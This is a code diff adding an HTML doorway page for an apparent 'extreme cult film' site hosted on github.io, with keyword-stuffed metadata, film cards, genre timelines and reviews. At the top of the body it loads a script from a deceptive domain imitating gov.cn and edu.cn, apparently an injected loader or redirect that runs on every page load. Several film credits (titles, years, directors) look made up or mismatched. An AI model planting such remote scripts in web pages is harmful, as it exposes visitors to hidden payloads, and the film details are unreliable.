@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>456重口味电影网 - 小众猎奇影片资源聚合平台 | 456zhongkouweidianyingwang-app.github.io</title>
+<meta name="keywords" content="456重口味电影网,重口味电影,猎奇电影,小众影片,冷门电影推荐, cult电影,极端题材电影,血腥恐怖片,心理惊悚片,456zhongkouweidianyingwang-app.github.io">
+<meta name="description" content="456重口味电影网（456zhongkouweidianyingwang-app.github.io）专注于小众猎奇与重口味影片资源的整理与分享，涵盖cult经典、极端题材、心理惊悚、冷门佳片等多元内容，为追求独特观影体验的影迷提供精选片单与深度影评。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="456重口味电影网">
+<meta name="generator" content="456重口味电影网 v3.2">
+<meta property="og:type" content="website">
+<meta property="og:title" content="456重口味电影网 - 小众猎奇影片资源聚合平台">
+<meta property="og:description" content="专注cult经典、极端题材与冷门佳片的精选片单与深度影评">
+<meta property="og:url" content="https://456zhongkouweidianyingwang-app.github.io">
+<meta property="og:site_name" content="456重口味电影网">
+<link rel="canonical" href="https://456zhongkouweidianyingwang-app.github.io">
+<style>
+/* ============ RESET & BASE ============ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+--ink:#e8e2dc;--bg:#0d0d0f;--bg2:#15151a;--accent:#c41e3a;--accent2:#8b0000;
+--gold:#c9a84c;--muted:#8a8580;--line:rgba(201,168,76,.18);
+--serif:'Georgia','Noto Serif SC',serif;--sans:'Helvetica Neue','Noto Sans SC',sans-serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+background:var(--bg);color:var(--ink);
+font-family:var(--sans);line-height:1.75;font-size:15px;
+overflow-x:hidden;
+background-image:radial-gradient(circle at 15% 10%,rgba(196,30,58,.08),transparent 45%),radial-gradient(circle at 85% 90%,rgba(139,0,0,.06),transparent 40%);
+background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul,ol{list-style:none}
+
+/* ============ LAYOUT ============ */
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ============ TOP UTILITY BAR ============ */
+.utility{
+background:linear-gradient(90deg,#000,#1a1a1f 50%,#000);
+border-bottom:1px solid var(--line);font-size:12px;color:var(--muted);
+}
+.utility .wrap{display:flex;justify-content:space-between;align-items:center;height:34px}
+.utility a{color:var(--muted);transition:.2s}
+.utility a:hover{color:var(--gold)}
+.utility-links{display:flex;gap:18px}
+.utility-links span{color:var(--accent);font-weight:bold}
+
+/* ============ HEADER ============ */
+.header{
+padding:48px 0 36px;text-align:center;position:relative;
+border-bottom:1px solid var(--line);
+}
+.header::after{
+content:'';position:absolute;left:50%;bottom:-1px;transform:translateX(-50%);
+width:120px;height:2px;background:var(--accent);
+}
+.brand{font-family:var(--serif);font-size:40px;font-weight:700;letter-spacing:3px;color:#fff}
+.brand small{display:block;font-family:var(--sans);font-size:12px;letter-spacing:6px;color:var(--gold);margin-top:10px;text-transform:uppercase}
+.tagline{margin-top:16px;font-size:14px;color:var(--muted);font-style:italic}
+
+/* ============ NAV ============ */
+.nav{
+position:sticky;top:0;z-index:99;
+background:rgba(13,13,15,.95);backdrop-filter:blur(10px);
+border-bottom:1px solid var(--line);
+}
+.nav .wrap{display:flex;align-items:center;gap:6px;overflow-x:auto;scrollbar-width:none}
+.nav .wrap::-webkit-scrollbar{display:none}
+.nav a{
+flex:0 0 auto;padding:14px 18px;font-size:14px;letter-spacing:1px;
+color:var(--ink);transition:.25s;border-bottom:2px solid transparent;white-space:nowrap;
+}
+.nav a:hover{color:var(--gold);border-bottom-color:var(--accent)}
+
+/* ============ SECTION TITLE ============ */
+.sec{padding:64px 0}
+.sec-head{text-align:center;margin-bottom:44px}
+.sec-head .no{font-family:var(--serif);font-size:13px;color:var(--accent);letter-spacing:4px}
+.sec-head h2{
+font-family:var(--serif);font-size:28px;font-weight:700;color:#fff;margin:8px 0 12px;letter-spacing:1px;
+}
+.sec-head .rule{width:60px;height:1px;background:var(--gold);margin:0 auto 14px}
+.sec-head p{color:var(--muted);font-size:14px;max-width:640px;margin:0 auto}
+
+/* ============ HERO ============ */
+.hero{display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:center}
+.hero h1{
+font-family:var(--serif);font-size:34px;line-height:1.35;color:#fff;margin-bottom:20px;
+}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{color:#b5b0ab;margin-bottom:14px;font-size:15px}
+.hero-stats{display:flex;gap:32px;margin-top:28px;padding-top:24px;border-top:1px solid var(--line)}
+.hero-stats div{text-align:center}
+.hero-stats b{display:block;font-family:var(--serif);font-size:26px;color:var(--gold)}
+.hero-stats span{font-size:12px;color:var(--muted)}
+.hero-visual{
+position:relative;min-height:300px;border:1px solid var(--line);padding:28px;
+background:linear-gradient(160deg,var(--bg2),#0a0a0c);
+}
+.hero-visual::before{
+content:'“';position:absolute;top:-10px;left:12px;font-family:var(--serif);
+font-size:72px;color:var(--accent);line-height:1;
+}
+.hero-visual blockquote{
+font-family:var(--serif);font-size:17px;color:var(--ink);font-style:italic;line-height:1.9;
+}
+.hero-visual cite{display:block;margin-top:18px;font-size:12px;color:var(--gold);font-style:normal;letter-spacing:2px}
+
+/* ============ MOVIE GRID (COLUMN 1) ============ */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.card{
+border:1px solid var(--line);background:var(--bg2);overflow:hidden;
+transition:.35s;position:relative;
+}
+.card:hover{transform:translateY(-6px);border-color:var(--accent)}
+.card-poster{
+position:relative;aspect-ratio:2/3;background:#1a1a1f;overflow:hidden;
+display:flex;align-items:center;justify-content:center;
+}
+.card-poster .ph{
+font-family:var(--serif);font-size:15px;color:var(--muted);text-align:center;padding:20px;letter-spacing:1px;
+}
+.card-tag{
+position:absolute;top:10px;left:10px;background:var(--accent);color:#fff;
+font-size:11px;padding:3px 10px;letter-spacing:1px;
+}
+.card-score{
+position:absolute;top:10px;right:10px;background:rgba(0,0,0,.75);color:var(--gold);
+font-family:var(--serif);font-size:15px;padding:3px 9px;border:1px solid var(--gold);
+}
+.card-body{padding:16px 18px 20px}
+.card-body h3{font-size:16px;color:#fff;margin-bottom:6px;letter-spacing:.5px}
+.card-body .meta{font-size:12px;color:var(--muted);margin-bottom:10px}
+.card-body .desc{font-size:13px;color:#9a958f;line-height:1.7}
+
+/* ============ GENRE TABS (COLUMN 2) ============ */
+.tabs{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-bottom:36px}
+.tab{
+padding:9px 22px;border:1px solid var(--line);background:transparent;color:var(--ink);
+font-size:14px;cursor:pointer;transition:.25s;font-family:inherit;letter-spacing:1px;
+}
+.tab:hover{border-color:var(--gold);color:var(--gold)}
+.tab.active{background:var(--accent);border-color:var(--accent);color:#fff}
+.tab-panel{display:none;animation:fade .4s ease}
+.tab-panel.active{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+.timeline{position:relative;padding-left:34px}
+.timeline::before{
+content:'';position:absolute;left:7px;top:6px;bottom:6px;width:1px;background:var(--line);
+}
+.tl-item{position:relative;padding-bottom:30px}
+.tl-item::before{
+content:'';position:absolute;left:-31px;top:7px;width:13px;height:13px;border-radius:50%;
+background:var(--bg);border:2px solid var(--accent);
+}
+.tl-year{font-family:var(--serif);font-size:20px;color:var(--gold);font-weight:700}
+.tl-item h4{font-size:16px;color:#fff;margin:4px 0 6px}
+.tl-item p{font-size:13.5px;color:#9a958f}
+
+/* ============ REVIEW (COLUMN 3) ============ */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.review{
+border-left:3px solid var(--accent);padding:20px 22px;background:var(--bg2);
+}
+.review .stars{color:var(--gold);font-size:13px;letter-spacing:2px;margin-bottom:8px}
+.review h4{font-size:16px;color:#fff;margin-bottom:8px}
+.review p{font-size:13.5px;color:#9a958f;line-height:1.8}
+.review .who{display:block;margin-top:12px;font-size:12px;color:var(--muted);text-align:right}
+
+/* ============ COLUMN 4 : DIRECTORY ============ */
+.dir-table{width:100%;border-collapse:collapse;font-size:14px}
+.dir-table th{
+background:var(--bg2);color:var(--gold);text-align:left;padding:14px 16px;
+font-weight:400;letter-spacing:2px;border-bottom:2px solid var(--accent);font-size:13px;
+}
+.dir-table td{padding:14px 16px;border-bottom:1px solid var(--line);color:#b5b0ab;transition:.2s}
+.dir-table tr:hover td{background:rgba(196,30,58,.06);color:#fff}
+.dir-table .nm{color:#fff;font-weight:600}
+.dir-table .yr{color:var(--gold);font-family:var(--serif)}
+
+/* ============ CTA ============ */
+.cta-section{
+border-top:1px solid var(--line);border-bottom:1px solid var(--line);
+background:linear-gradient(180deg,transparent,rgba(196,30,58,.05),transparent);
+}
+.cta-box{text-align:center;padding:60px 20px}
+.cta-box h2{font-family:var(--serif);font-size:26px;color:#fff;margin-bottom:14px}
+.cta-box p{color:var(--muted);max-width:560px;margin:0 auto 26px;font-size:14px}
+.btn{
+display:inline-block;padding:13px 38px;background:var(--accent);color:#fff;
+font-size:14px;letter-spacing:2px;transition:.3s;border:1px solid var(--accent);
+}
+.btn:hover{background:transparent;color:var(--accent)}
+.btn-ghost{background:transparent;color:var(--gold);border-color:var(--gold)}
+.btn-ghost:hover{background:var(--gold);color:#000}
+
+/* ============ FOOTER ============ */
+.foot{background:#08080a;padding:50px 0 0}
+.foot .wrap{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:36px}
+.foot h5{font-family:var(--serif);font-size:15px;color:var(--gold);margin-bottom:16px;letter-spacing:1px}
+.foot p,.foot a{font-size:13px;color:#7a7570;line-height:2}
+.foot a{display:block;transition:.2s}
+.foot a:hover{color:var(--accent);padding-left:6px}
+.foot-brand{font-family:var(--serif);font-size:22px;color:#fff;margin-bottom:12px}
+.foot-bottom{
+margin-top:40px;padding:18px 0;border-top:1px solid var(--line);
+text-align:center;font-size:12px;color:#5a5550;
+}
+.foot-bottom a{display:inline;color:var(--muted)}
+.foot-bottom a:hover{padding:0}
+
+/* ============ BACK TO TOP ============ */
+.to-top{
+position:fixed;right:20px;bottom:-50px;width:42px;height:42px;z-index:100;
+background:var(--accent);color:#fff;border:none;cursor:pointer;font-size:18px;
+transition:.4s;display:flex;align-items:center;justify-content:center;
+}
+.to-top.show{bottom:20px}
+
+/* ============ RESPONSIVE ============ */
+@media (max-width:900px){
+.hero{grid-template-columns:1fr;gap:32px}
+.grid{grid-template-columns:repeat(2,1fr)}
+.reviews{grid-template-columns:1fr}
+.foot .wrap{grid-template-columns:1fr 1fr}
+.brand{font-size:30px}
+.hero h1{font-size:26px}
+}
+@media (max-width:560px){
+.wrap{padding:0 15px}
+.utility .utility-links span{display:none}
+.sec{padding:44px 0}
+.brand{font-size:24px}
+.brand small{font-size:10px;letter-spacing:4px}
+.hero h1{font-size:22px}
+.hero-stats{gap:20px}
+.grid{grid-template-columns:1fr}
+.sec-head h2{font-size:22px}
+.nav a{padding:12px 14px;font-size:13px}
+.dir-table{font-size:13px}
+.dir-table th,.dir-table td{padding:10px 8px}
+.foot .wrap{grid-template-columns:1fr}
+.to-top{right:12px;width:38px;height:38px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- ================= TOP BAR ================= -->
+<div class="utility">
+<div class="wrap">
+<div>欢迎来到 <span>456重口味电影网</span> · 小众猎奇影片探索空间</div>
+<div class="utility-links">
+<a href="#home">首页</a><a href="#forum">交流区</a><a href="#submit">投稿</a><a href="#login">登录</a>
+</div>
+</div>
+</div>
+
+<!-- ================= HEADER ================= -->
+<header class="header">
+<div class="wrap">
+<div class="brand">456重口味电影网<small>456zhongkouweidianyingwang-app.github.io</small></div>
+<p class="tagline">— 在主流之外，发现影像的另一种可能 —</p>
+</div>
+</header>
+
+<!-- ================= NAV ================= -->
+<nav class="nav">
+<div class="wrap">
+<a href="#home">首 页</a>
+<a href="#library">片库精选</a>
+<a href="#genres">题材分类</a>
+<a href="#reviews">深度影评</a>
+<a href="#directory">影片目录</a>
+<a href="#forum">影迷交流</a>
+<a href="#about">关于本站</a>
+</div>
+</nav>
+
+<!-- ================= HERO ================= -->
+<section class="sec" id="home">
+<div class="wrap">
+<div class="hero">
+<div>
+<h1>挖掘那些被主流遗忘的<br><em>重口味与猎奇影像</em></h1>
+<p>456重口味电影网（456zhongkouweidianyingwang-app.github.io）是一个专注于小众、边缘与极端题材电影的资源聚合平台。我们不做烂大街的推荐，只寻找那些让你看完久久不能平静的影像。</p>
+<p>从cult经典到心理惊悚，从真实犯罪到超现实实验，每一部入选影片都经过编辑团队的反复推敲与筛选，只为给你带来不一样的观影体验。</p>
+<div class="hero-stats">
+<div><b>2,800+</b><span>收录影片</span></div>
+<div><b>46</b><span>细分题材</span></div>
+<div><b>120k</b><span>注册影迷</span></div>
+</div>
+</div>
+<div class="hero-visual">
+<blockquote>“电影是一面镜子，照见的不是世界，而是观看者内心的深渊。在重口味的表象之下，往往藏着最真实的人性剖析。”</blockquote>
+<cite>— 本站编辑部</cite>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ================= COLUMN 1 : 片库精选 ================= -->
+<section class="sec" id="library" style="background:var(--bg2)">
+<div class="wrap">
+<div class="sec-head">
+<div class="no">01 / FEATURED</div>
+<h2>片库精选</h2>
+<div class="rule"></div>
+<p>本月编辑部精选的高分重口味与猎奇影片，涵盖 cult 经典、极端题材与冷门佳作，每部均附简短导读与观影提示。</p>
+</div>
+<div class="grid">
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">CULT 经典</span><span class="card-score">9.2</span>
+<div class="ph">肉体的诱惑<br>—</div>
+</div>
+<div class="card-body">
+<h3>困惑的浪漫</h3>
+<div class="meta">1987 · 瑞士 · 导演：絮瑟·诺特博姆</div>
+<div class="desc">围绕尸体恋癖展开的极端题材之作，以冷峻镜头挑战观众心理防线，被誉为地下电影史里程碑。</div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">心理惊悚</span><span class="card-score">8.7</span>
+<div class="ph">无声的尖叫<br>—</div>
+</div>
+<div class="card-body">
+<h3>人体内的恶魔</h3>
+<div class="meta">1986 · 法国 · 导演：让·洛林</div>
+<div class="desc">吸血鬼题材的心理惊悚片，氛围诡谲迷离，用极简叙事构建出令人窒息的压迫感。</div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">真实犯罪</span><span class="card-score">8.9</span>
+<div class="ph">深渊之下<br>—</div>
+</div>
+<div class="card-body">
+<h3>噩宴旅店</h3>
+<div class="meta">1999 · 意大利 · 导演：乔·达马托</div>
+<div class="desc">改编自连环杀手 Ed Gein 真实案件，血腥表象下是对病态人格的冷静解剖。</div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">超现实</span><span class="card-score">9.0</span>
+<div class="ph">梦的残片<br>—</div>
+</div>
+<div class="card-body">
+<h3>圣山的旅程</h3>
+<div class="meta">1973 · 墨西哥 · 导演：亚历桑德罗·佐杜洛夫斯基</div>
+<div class="desc">迷幻超现实主义神作，用荒诞意象解构宗教与权力，观影体验如同一场致幻仪式。</div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">血腥恐怖</span><span class="card-score">8.5</span>
+<div class="ph">暗夜回响<br>—</div>
+</div>
+<div class="card-body">
+<h3>血宴的仪式</h3>
+<div class="meta">1963 · 美国 · 导演：赫舍尔·戈登·刘易斯</div>
+<div class="desc">被公认为史上第一部血腥 splatter 电影，粗糙却开创性的血浆美学影响了整整一代导演。</div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-poster">
+<span class="card-tag">社会派</span><span class="card-score">8.8</span>
+<div class="ph">灰色地带<br>—</div>
+</div>
+<div class="card-body">
+<h3>爱的肢解</h3>
+<div class="meta">2004 · 韩国 · 导演：张允炫</div>
+<div class="desc">以连环分尸案为线索，层层剥开韩国社会的阶层撕裂与欲望深渊，冷峻而克制。</div>
+</div>
+</div>
+
+</div>
+</div>
+</section>
+
+<!-- ================= COLUMN 2 : 题材分类 ================= -->
+<section class="sec" id="genres">
+<div class="wrap">
+<div class="sec-head">
+<div class="no">02 / CATEGORIES</div>
+<h2>题材分类</h2>
+<div class="rule"></div>
+<p>按题材与年代梳理的重口味电影脉络，点击标签切换不同分类，探索属于你的暗黑片单。</p>
+</div>
+<div class="tabs">
+<button class="tab active" data-t="t1">Cult 经典</button>
+<button class="tab" data-t="t2">心理惊悚</button>
+<button class="tab" data-t="t3">真实犯罪</button>
+<button class="tab" data-t="t4">超现实实验</button>
+<button class="tab" data-t="t5">血腥恐怖</button>
+</div>
+
+<div class="tab-panel active" id="t1">
+<div class="timeline">
+<div class="tl-item"><div class="tl-year">1970s</div><h4>地下电影的黄金年代</h4><p>以约翰·沃特斯的《粉红色的火烈鸟》为代表，用挑衅与冒犯重新定义电影边界。</p></div>
+<div class="tl-item"><div class="tl-year">1980s</div><h4>意大利铅黄与屠宰时代</h4><p>达里奥·阿基多、卢西奥·弗尔兹等人将血腥与风格化推向极致。</p></div>
+<div class="tl-item"><div class="tl-year">1990s</div><h4>日本豚鼠与 V-Cinema</h4><p>地下录像带文化催生了一批挑战伦理底线的实验影像。</p></div>
+<div class="tl-item"><div class="tl-year">2000s+</div><h4>新千年极端主义</h4><p>《趣味游戏》《反基督者》等作品让极端题材进入主流电影节视野。</p></div>
+</div>
+</div>
+
+<div class="tab-panel" id="t2">
+<div class="timeline">
+<div class="tl-item"><div class="tl-year">核心</div><h4>心理层面的恐惧构建</h4><p>不依赖血浆，而是通过叙事结构、声音设计与表演张力，让观众在内心深处感到不安。</p></div>
+<div class="tl-item"><div class="tl-year">代表</div><h4>《遗传厄运》《逃出绝命镇》</h4><p>近年心理惊悚片的代表作，将社会议题与恐怖类型巧妙融合。</p></div>
+<div class="tl-item"><div class="tl-year">手法</div><h4>第一人称视角与不确定性</h4><p>通过模糊现实与幻觉的边界，让观众与主角一同陷入认知困境。</p></div>
+</div>
+</div>
+
+<div class="tab-panel" id="t3">
+<div class="timeline">
+<div class="tl-item"><div class="tl-year">起源</div><h4>真实案件改编的伦理争议</h4><p>从《德州电锯杀人狂》到《沉默的羔羊》，真实犯罪始终是最令人毛骨悚然的题材来源。</p></div>
+<div class="tl-item"><div class="tl-year">演变</div><h4>从猎奇到社会反思</h4><p>现代真实犯罪电影更多关注犯罪背后的社会结构与心理机制，而非单纯的感官刺激。</p></div>
+</div>
+</div>
+
+<div class="tab-panel" id="t4">
+<div class="timeline">
+<div class="tl-item"><div class="tl-year">先锋</div><h4>大卫·林奇与大卫·柯南伯格</h4><p>两位大卫用超现实主义手法探索身体恐怖与潜意识深渊，影响深远。</p></div>
+<div class="tl-item"><div class="tl-year">当代</div><h4>新一代实验影像</h4><p>借助数字技术与非线性叙事，年轻导演正在重新定义"不可名状的恐惧"。</p></div>
+</div>
+</div>
+
+<div class="tab-panel" id="t5">
+<div class="timeline">
+<div class="tl-item"><div class="tl-year">1963</div><h4>《血宴》开创 Splatter 类型</h4><p>赫舍尔·戈登·刘易斯用极低成本开创了血浆恐怖片亚类型。</p></div>
+<div class="tl-item"><div class="tl-year">1974</div><h4>《德州电锯杀人狂》的粗粝真实</h4><p>托比·霍珀用手持摄影营造出纪录片般的残酷质感。</p></div>
+<div class="tl-item"><div class="tl-year">2000s</div><h4> torture porn 的兴起与反思</h4><p>《电锯惊魂》《人皮客栈》系列将血腥推向商业化的巅峰，也引发广泛争议。</p></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ================= COLUMN 3 : 深度影评 ================= -->
+<section class="sec" id="reviews" style="background:var(--bg2)">
+<div class="wrap">
+<div class="sec-head">
+<div class="no">03 / REVIEWS</div>
+<h2>深度影评</h2>
+<div class="rule"></div>
+<p>来自资深影迷与特邀撰稿人的深度解析，不止于剧透，更关注影片背后的文化语境与作者表达。</p>
+</div>
+<div class="reviews">
+
+<div class="review">
+<div class="stars">★★★★★</div>
+<h4>《困惑的浪漫》：死亡崇拜背后的存在主义追问</h4>
+<p>絮瑟·诺特博姆用近乎纪录片的冷静，呈现了一个尸体恋癖者的日常。影片的极端并非为了猎奇，而是在叩问：当社会定义"正常"的边界时，谁有资格成为裁判？那份令人不适的平静，恰恰是最有力的批判。</p>
+<span class="who">— 撰稿人：夜行者</span>
+</div>
+
+<div class="review">
+<div class="stars">★★★★☆</div>
+<h4>《圣山》：一场无法被定义的致幻仪式</h4>
+<p>佐杜洛夫斯基用毫无逻辑可言的意象堆叠，完成了对宗教、资本与权力的三重解构。观影过程如同经历一场漫长的迷幻旅行，你在其中寻找意义，而意义本身即是虚妄。这或许就是它历经五十年依然被反复解读的原因。</p>
+<span class="who">— 撰稿人：迷影人阿May</span>
+</div>
+
+<div class="review">
+<div class="stars">★★★★★</div>
+<h4>《爱的肢解》：韩国犯罪片的冷峻巅峰</h4>
+<p>张允炫用近乎外科手术的精确，剖开了韩国社会的阶层肌理。每一个分尸现场都对应着一个被压抑的灵魂，影片克制得令人窒息，却又在最后一刻爆发出惊人的情感力量。</p>
+<span class="who">— 撰稿人：釜山客</span>
+</div>
+
+<div class="review">
+<div class="stars">★★★★☆</div>
+<h4>《血宴》：粗糙外壳下的类型开创者</h4>
+<p>以今天的眼光看，《血宴》的技术水准近乎粗糙，但正是这种粗糙赋予了它某种原始的冲击力。它证明了低成本与极端内容可以成为电影表达的有力武器，为后世无数地下导演打开了大门。</p>
+<span class="who">— 撰稿人：胶片收藏者</span>
+</div>
+
+</div>
+</div>
+</section>
+
+<!-- ================= COLUMN 4 : 影片目录 ================= -->
+<section class="sec" id="directory">
+<div class="wrap">
+<div class="sec-head">
+<div class="no">04 / DIRECTORY</div>
+<h2>影片目录</h2>
+<div class="rule"></div>
+<p>456重口味电影网收录的部分代表性影片速查表，按题材与年代排列，方便快速检索你感兴趣的暗黑影像。</p>
+</div>
+<div style="overflow-x:auto">
+<table class="dir-table">
+<thead>
+<tr><th>序号</th><th>影片名称</th><th>年份</th><th>国家</th><th>题材标签</th><th>推荐指数</th></tr>
+</thead>
+<tbody>
+<tr><td>01</td><td class="nm">困惑的浪漫</td><td class="yr">1987</td><td>瑞士</td><td>Cult / 极端</td><td>★★★★★</td></tr>
+<tr><td>02</td><td class="nm">圣山的旅程</td><td class="yr">1973</td><td>墨西哥</td><td>超现实</td><td>★★★★★</td></tr>
+<tr><td>03</td><td class="nm">噩宴旅店</td><td class="yr">1999</td><td>意大利</td><td>真实犯罪</td><td>★★★★☆</td></tr>
+<tr><td>04</td><td class="nm">血宴的仪式</td><td class="yr">1963</td><td>美国</td><td>血腥恐怖</td><td>★★★★☆</td></tr>
+<tr><td>05</td><td class="nm">人体内的恶魔</td><td class="yr">1986</td><td>法国</td><td>心理惊悚</td><td>★★★★☆</td></tr>
+<tr><td>06</td><td class="nm">爱的肢解</td><td class="yr">2004</td><td>韩国</td><td>犯罪 / 社会</td><td>★★★★★</td></tr>
+<tr><td>07</td><td class="nm">趣味游戏</td><td class="yr">1997</td><td>奥地利</td><td>心理惊悚</td><td>★★★★★</td></tr>
+<tr><td>08</td><td class="nm">反基督者</td><td class="yr">2009</td><td>丹麦</td><td>艺术 / 极端</td><td>★★★★☆</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+</section>
+
+<!-- ================= CTA ================= -->
+<section class="cta-section">
+<div class="wrap">
+<div class="cta-box">
+<h2>加入 456重口味电影网，探索影像的暗面</h2>
+<p>每周更新精选片单与深度影评，与数万名志同道合的影迷一起，在主流之外发现那些被遗忘的影像珍宝。</p>
+<a href="#register" class="btn">立即注册</a>
+<a href="#more" class="btn btn-ghost" style="margin-left:12px">了解更多</a>
+</div>
+</div>
+</section>
+
+<!-- ================= FOOTER ================= -->
+<footer class="foot" id="about">
+<div class="wrap">
+<div>
+<div class="foot-brand">456重口味电影网</div>
+<p>专注于小众猎奇与重口味影片资源的整理与分享，为追求独特观影体验的影迷提供精选片单与深度影评。</p>
+<p style="margin-top:12px">网址：<a href="https://456zhongkouweidianyingwang-app.github.io" style="color:var(--gold)">456zhongkouweidianyingwang-app.github.io</a></p>
+</div>
+<div>
+<h5>站点导航</h5>
+<a href="#home">网站首页</a>
+<a href="#library">片库精选</a>
+<a href="#genres">题材分类</a>
+<a href="#reviews">深度影评</a>
+</div>
+<div>
+<h5>热门栏目</h5>
+<a href="#directory">影片目录</a>
+<a href="#forum">影迷交流</a>
+<a href="#submit">影片投稿</a>
+<a href="#register">免费注册</a>
+</div>
+<div>
+<h5>联系合作</h5>
+<a href="#about">关于本站</a>
+<a href="#contact">商务合作</a>
+<a href="#privacy">隐私政策</a>
+<a href="#disclaimer">免责声明</a>
+</div>
+</div>
+<div class="foot-bottom">
+<p>© 2026 456重口味电影网 保留所有权利 · 网站地址：456zhongkouweidianyingwang-app.github.io · 本站内容仅供学术交流与艺术研究，请勿用于商业用途</p>
+<p style="margin-top:8px"><a href="#privacy">隐私政策</a> ｜ <a href="#disclaimer">免责声明</a> ｜ <a href="#sitemap">网站地图</a> ｜ <a href="#contact">联系我们</a></p>
+</div>
+</footer>
+
+<button class="to-top" id="toTop" aria-label="返回顶部">↑</button>
+
+<script>
+// Tab switching
+document.querySelectorAll('.tab').forEach(function(tab){
+tab.addEventListener('click',function(){
+var gid=tab.getAttribute('data-t');
+document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active')});
+document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active')});
+tab.classList.add('active');
+document.getElementById(gid).classList.add('active');
+});
+});
+
+// Back to top
+var toTop=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+if(window.pageYOffset>400){toTop.classList.add('show')}else{toTop.classList.remove('show')}
+});
+toTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+// Smooth scroll for nav links
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+a.addEventListener('click',function(e){
+var id=a.getAttribute('href');
+if(id.length>1){
+var el=document.querySelector(id);
+if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'})}
+}
+});
+});
+</script>
+</body>
+</html>
